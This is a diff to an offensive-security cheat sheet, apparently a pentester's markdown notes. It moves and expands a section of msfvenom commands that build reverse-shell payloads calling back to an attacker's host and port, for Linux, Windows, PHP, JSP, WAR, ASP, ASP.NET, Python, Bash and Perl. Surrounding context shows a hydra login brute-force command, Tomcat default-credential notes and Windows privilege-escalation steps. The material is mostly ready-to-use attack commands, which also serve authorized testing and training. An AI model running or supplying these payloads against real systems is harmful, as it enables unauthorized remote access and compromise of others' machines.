@@ -88,18 +88,6 @@ Downloading all files from a directory
 
 <code>hydra -l/-L [USERNAME/USER_LIST] -P [PASSWORDLIST] [IP] http-form-post "[ENDPOINT]:[POST_PARAMETERS]&User=^USER^&Password=^PASS^:[FAILED_LOGIN_ERROR]."</code>
 
-### ASP / ASP.NET
-
-#### ASP Paylod: 
-
-<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f asp > shell.asp</code>
-
-#### ASP.NET Payload: 
-
-<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f aspx > shell.aspx</code>
-
-<code>msfvenom -p windows/shell_reverse_tcp LHOST=]LOCAL_IP] LPORT=[PORT] -f asp-exe > shell.aspx</code>
-
 ### Tomcat
 
 #### Default Credentials
@@ -231,7 +219,6 @@ Use listener
 - [GTFOBins](https://gtfobins.github.io/)
 - [Priv Esc with SUIDs](https://www.hackingarticles.in/linux-privilege-escalation-using-suid-binaries/)
 
-
 ## Windows Privilege Escalation
 
 ### Juicy Potato
@@ -270,7 +257,6 @@ Run the exploit on the target host.
 
 ### Service Exploitation
 
-
 #### Windows XP SP0/SP1
 
 Upload <code>accesschk.exe</code> and <code>nc.exe</code> to the target host.
@@ -304,3 +290,49 @@ Starting / Stopping the Service
 <code>net start [SERVICE]</code>
 
 <code>net stop [SERVICE]</code>
+
+## MSFvenom Payloads
+
+### Linux
+
+<code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f elf > shell.elf</code>
+
+### Windows
+
+<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f exe > shell.exe</code>
+
+### PHP
+
+<code>msfvenom -p php/reverse_php LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.php</code>
+
+Append <code><?php</code>
+
+### JSP
+
+<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.jsp</code>
+
+### WAR
+
+<code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f war > shell.war</code>
+
+### ASP Paylod: 
+
+<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f asp > shell.asp</code>
+
+### ASP.NET Payload: 
+
+<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f aspx > shell.aspx</code>
+
+<code>msfvenom -p windows/shell_reverse_tcp LHOST=[LOCAL_IP] LPORT=[PORT] -f asp-exe > shell.aspx</code>
+
+### Python
+
+<code>msfvenom -p cmd/unix/reverse_python LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.py</code>
+
+### Bash
+
+<code>msfvenom -p cmd/unix/reverse_bash LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.sh</code>
+
+### Perl
+
+<code>msfvenom -p cmd/unix/reverse_perl LHOST=[LOCAL_IP] LPORT=[PORT] -f raw > shell.pl</code>
